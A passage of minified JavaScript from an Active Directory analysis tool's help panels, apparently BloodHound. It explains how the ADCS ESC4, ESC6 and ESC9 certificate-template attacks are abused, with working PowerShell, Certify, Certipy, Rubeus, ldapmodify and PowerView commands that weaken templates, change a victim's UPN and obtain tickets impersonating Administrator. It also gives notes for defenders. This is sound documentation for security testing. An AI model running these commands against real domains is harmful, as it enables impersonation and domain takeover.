                        Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
                    }
                }`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["Flip the ",e.jsx("code",{children:"CT_FLAG_PEND_ALL_REQUESTS"})," flag:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $flagToFlip = 0x00000002         # CT_FLAG_PEND_ALL_REQUESTS
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Flip flag
                $curValue = $template.Properties["msPKI-Enrollment-Flag"].Value
                $template.Properties["msPKI-Enrollment-Flag"].Value = $curValue -bxor $flagToFlip
                $template.CommitChanges()
                $ldap.Close()`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["To run the LDAP query as another principal, replace ",e.jsx("code",{children:"DirectoryEntry($ldapPath)"})," with"," ",e.jsx("code",{children:"DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)"})," to specify the credentials of the principal.",e.jsx("br",{}),e.jsx("br",{}),"Run the first PowerShell snippet again to confirm the ",e.jsx("code",{children:"CT_FLAG_PEND_ALL_REQUESTS"})," flag has been enabled.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, remove the flag by running the script that flips the flag once again."]})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 4: "}),"Ensure the certificate template does not require authorized signatures.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template does not require authorized signatures if the CertTemplate node's"," ",e.jsx("em",{children:"Authorized Signatures Required"})," (",e.jsx("code",{children:"authorizedsignatures"}),") is set to 0 or if the"," ",e.jsx("em",{children:"Schema Version"})," (",e.jsx("code",{children:"schemaversion"}),") is 1. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template requires authorized signatures if the certificate template's"," ",e.jsx("code",{children:"msPKI-RA-Signature"})," attribute value is more than zero. Use the following PowerShell snippet to check the value of the ",e.jsx("code",{children:"msPKI-RA-Signature"})," attribute:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Print attribute
                Write-Host "msPKI-RA-Signature: $($template.Properties["msPKI-RA-Signature"])"
                $ldap.Close()`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["Set ",e.jsx("code",{children:"msPKI-RA-Signature"})," to 0:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $noSignatures = [Int32]0
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Set No. of authorized signatures required
                $template.Properties["msPKI-RA-Signature"].Value = $noSignatures
                $template.CommitChanges()
                $ldap.Close()`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["To run the LDAP query as another principal, replace ",e.jsx("code",{children:"DirectoryEntry($ldapPath)"})," with"," ",e.jsx("code",{children:"DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)"})," to specify the credentials of the principal.",e.jsx("br",{}),e.jsx("br",{}),"Run the first PowerShell snippet again to confirm the ",e.jsx("code",{children:"msPKI-RA-Signature"})," attribute has been set.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the ",e.jsx("code",{children:"msPKI-RA-Signature"})," attribute back to the original value by running PowerShell snippet that sets the value, but with the original value instead of 0."]})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 5: "}),"Ensure the principal has enrollment rights on the certificate template.",e.jsx("br",{}),e.jsx("br",{}),"The principal does have enrollment rights on the certificate template if BloodHound returns a path for this Cypher query (replace ",e.jsx("code",{children:'"PRINCIPAL@DOMAIN.NAME"'})," and"," ",e.jsx("code",{children:'"CERTTEMPLATE@DOMAIN.NAME"'})," with the names of the principal and the certificate template):"]}),e.jsx(w,{children:`MATCH p = (x)-[:MemberOf*0..]->()-[:Enroll|AllExtendRights|GenericAll]->(ct:CertTemplate)
                WHERE x.name = "PRINCIPAL@DOMAIN.NAME" AND ct.name = "CERTTEMPLATE@DOMAIN.NAME"
                RETURN p`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["If a path is returned, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"Use the following PowerShell snippet to grant the principal Enroll on the certificate template:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $objectTypeByteArray = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                $inheritedObjectTypeByteArray = [GUID]"00000000-0000-0000-0000-000000000000"
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid     = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $objectTypeByteArray,
                    [System.Security.AccessControl.InheritanceFlags]::None,
                    $inheritedObjectTypeByteArray
                )
                
                # Add the new ACE to the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.AddAccessRule($ace)
                $template.psbase.CommitChanges()`}),e.jsx(t,{variant:"body2",className:r.containsCodeEl,children:"Confirm that the Enroll ACE was added:"}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Print ACEs granted to the principal
                $acl = $template.psbase.ObjectSecurity
                $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}),e.jsx(t,{variant:"body2",className:r.containsCodeEl,children:"After abuse, remove the Enroll ACE you added:"}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $objectTypeByteArray = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                $inheritedObjectTypeByteArray = [GUID]"00000000-0000-0000-0000-000000000000"
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid     = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $objectTypeByteArray,
                    [System.Security.AccessControl.InheritanceFlags]::None,
                    $inheritedObjectTypeByteArray
                )
                
                # Remove the ACE from the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.RemoveAccessRuleSpecific($ace)
                $template.psbase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:"The principal can now perform an ESC1 attack with the following steps:"})]}),u=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6"}),": Use Certify (2.0) to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:"]}),e.jsx(w,{children:"Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template TemplateName --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."})]}),m=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 7"}),": Optionally purge all kerberos tickets from memory:"]}),e.jsx(w,{hideWrap:!0,children:"klist purge"})]}),j=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 8"}),": Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate obtained in Step 6:"]}),e.jsx(w,{children:"Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:<cert base64> /ptt"})]}),v=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 9"}),": Optionally verify the TGT by listing it with the klist command:"]}),e.jsx(w,{hideWrap:!0,children:"klist"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform the ESC4 attack with the following steps."}),a,o,i,s,c,d,h,u,m,j,v]})},Ua={general:Na,windowsAbuse:_a,linuxAbuse:Ma,opsec:La,references:Fa,composition:Me},Wa=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the privileges to perform the ADCS ESC6 Scenario A attack against the target domain."]}),e.jsx(t,{variant:"body2",children:"The principal has permission to enroll on one or more certificate templates allowing for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allow an attacker principal to obtain a malicious certificate as any AD forest user or computer and use it for authentication and impersonation without knowing their credentials."})]}),Ba=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1"}),": Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:"]}),e.jsx(t,{component:"pre",children:"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2"}),": Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"}),e.jsx(t,{variant:"body2",children:"If the authentication fails then it may be because the DC enforces strong certificate mapping. This requirement can be met by including a URL parameter in the SAN with the target's SID, however not supported by Certipy. See the Windows abuse section for example."})]}),qa=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),Ka=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7",children:"Certipy 4.0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#editf_attributesubjectaltname2-esc6",children:"Domain Escalation Edit Attributes"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/preview-of-san-uri-for-certificate-strong-mapping-for-kb5014754/ba-p/3789785",children:"Preview of SAN URI for Certificate Strong Mapping for KB5014754"})]}),za=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1"}),": Use Certify (2.0) to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:"]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template User --upn Administrator --sid-url S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2"}),": With Rubeus, use the certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:"]}),e.jsx(t,{component:"pre",children:"Rubeus asktgt /user:Administrator /domain:forestroot.com /certificate:<cert base64> /ptt"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 3"}),": Optionally verify the TGT by listing it with the klist command:"]}),e.jsx(t,{component:"pre",children:"klist"})]}),Ha={general:Wa,windowsAbuse:za,linuxAbuse:Ba,opsec:qa,references:Ka,composition:Me},Va=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the privileges to perform the ADCS ESC6 Scenario B attack against the target domain."]}),e.jsx(t,{variant:"body2",children:"The principal has permission to enroll on one or more certificate templates allowing for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allow an attacker principal to obtain a malicious certificate as another principal. There is an affected Domain Controller configured to allow weak certificate mapping enforcement, which enables the attacker principal to authenticate with the malicious certificate and thereby impersonating any AD forest user or computer without their credentials."})]}),Ya=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 1:"})," ","Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:"]}),e.jsx(t,{component:"pre",children:"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local"}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 2:"})," ","Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"})]}),Qa=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),Ja=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:" https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7",children:"Certipy 4.0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#editf_attributesubjectaltname2-esc6",children:"Domain Escalation Edit Attributes"})]}),Xa=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 1:"})," ","Use Certify (2.0) to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:"]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template User --upn Administrator --sid-url S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."}),e.jsx(t,{variant:"body2",children:"If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default."}),e.jsxs(t,{variant:"body2",children:[e.jsx(l,{component:"span",sx:{fontWeight:"bold"},children:"Step 2:"})," ","Use Certipy to connect to the domain controller via Schannel, specifying the PFX-formatted certificate created in Step 1:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx .\\cert.pfx -dc-ip 10.4.0.4 -ldap-shell"})]}),Za={general:Va,windowsAbuse:Xa,linuxAbuse:Ya,opsec:Qa,references:Ja,composition:Me},eo=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},to=({sourceName:r,sourceType:a})=>{const o=J();return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the privileges to perform the ADCS ESC9 Scenario A attack against the target domain."]}),e.jsxs(t,{variant:"body2",className:o.containsCodeEl,children:["The principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the"," ",e.jsx("code",{children:"userPrincipalName"})," (UPN) of the enrollee included in the Subject Alternative Name (SAN), and 3) do not have the security extension enabled. The victim also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow weak certificate binding enforcement. This setup lets the principal impersonate any AD forest principal (user or computer) without their credentials."]}),e.jsxs(t,{variant:"body2",className:o.containsCodeEl,children:["The attacker principal can abuse their control over the victim principal to modify the victim’s UPN to match the ",e.jsx("code",{children:"sAMAccountName"}),` of a targeted principal. Example: If the targeted principal is Administrator@corp.local user, the victim's UPN will be populated with "Administrator" (without the @corp.local ending). The attacker principal will then abuse their control over the victim principal to obtain the credentials of the victim principal, or a session as the victim principal, and enroll a certificate as the victim in one of the affected certificate templates. The UPN of the victim ("Administrator") will be included in the issued certificate under the SAN. As the certificate template does not have the security extension, it will NOT include the SID of the victim user in the issued certificate. Next, the attacker principal will again set the UPN of the victim, this time to an arbitrary string (e.g. the original value). The issued certificate can now be used for authentication against an affected DC. The weak certificate binding configuration on the DC will make the DC accept that the SID of the victim user is not present in the issued certificate when performing Kerberos authentication, and it will use the SAN value to map the certificate to a principal. The DC will attempt to find a principal with a UPN matching the SAN value (“Administrator”) but as the victim’s UPN has been changed after the enrollment, there will be no principals with this UPN. The DC will then attempt to find a principal with a `,e.jsx("code",{children:"sAMAccountName"})," matching the SAN value and find the targeted user. At last, the DC issues a Kerberos TGT as the targeted user to the attacker, which means the attacker now has a session as the targeted user. In case the target is a computer, the DC will find it as well as the DC will attempt ",e.jsx("code",{children:"sAMAccountName"})," matching with a $ at the end of the SAN value as last resort."]})]})},ro=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Set UPN of victim to targeted principal's ",e.jsx("code",{children:"sAMAccountName"}),".",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn Target"})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or"," ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their ",e.jsx("code",{children:"mail"})," ","attribute set for the certificate enrollment. The CertTemplate BloodHound node will have",e.jsx("em",{children:'"Subject Require Email"'})," or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 3.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim’s mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using ldapsearch:"]}),e.jsx(t,{component:"pre",children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "VICTIM-DN" mail`}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 3.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:"]}),e.jsx(t,{component:"pre",children:`echo -e "dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`})]}),i=e.jsxs(l,{children:[e.jsxs(t,{variant:"body2",sx:{marginBottom:"-8px"},children:[e.jsx("b",{children:"Step 3: "}),"Obtain a session as victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step.",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a computer, you can obtain the credentials of the computer account using the Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),"). Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),").",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a user, you have the following options for obtaining the credentials:"]}),e.jsxs(B,{sx:{fontSize:"12px"},children:[e.jsxs(P,{children:["Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),")"]}),e.jsxs(P,{children:["Password reset (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/force-change-password",children:"ForceChangePassword edge documentation"}),")"]}),e.jsxs(P,{children:["Targeted Kerberoasting (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/write-spn",children:"WriteSPN edge documentation"}),")"]})]})]}),s=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 4: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The issued certificate will be saved to disk with the name of the targeted user."})]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Set UPN of victim to arbitrary value.",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn victim@corp.local"})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6: "}),"Perform Kerberos authentication as targeted principal against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 4 and the IP of an affected DC:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx TARGET.pfx -dc-ip IP"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d]})},no=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),ao=()=>{const r=[{label:"Certipy 4.0",link:"https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"},{label:"Certified Pre-Owned",link:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"},{label:"Certipy",link:"https://github.com/ly4k/Certipy"},{label:"GhostPack Certipy",link:"https://github.com/GhostPack/Certify"},{label:"GhostPack Rubeus",link:"https://github.com/GhostPack/Rubeus"},{label:"Set-DomainObject",link:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject"},{label:"CertUtil.exe",link:"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil"},{label:"LDAPSearch",link:"https://linux.die.net/man/1/ldapsearch"},{label:"LDAPModify",link:"https://linux.die.net/man/1/ldapmodify"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},oo=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Set UPN of victim to targeted principal's ",e.jsx("code",{children:"sAMAccountName"}),".",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Target'}"})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Check if mail attribute of victim must be set and set it if required. If the certificate",e.jsx("br",{}),e.jsx("br",{}),"template is of schema version 2 or above and its attribute 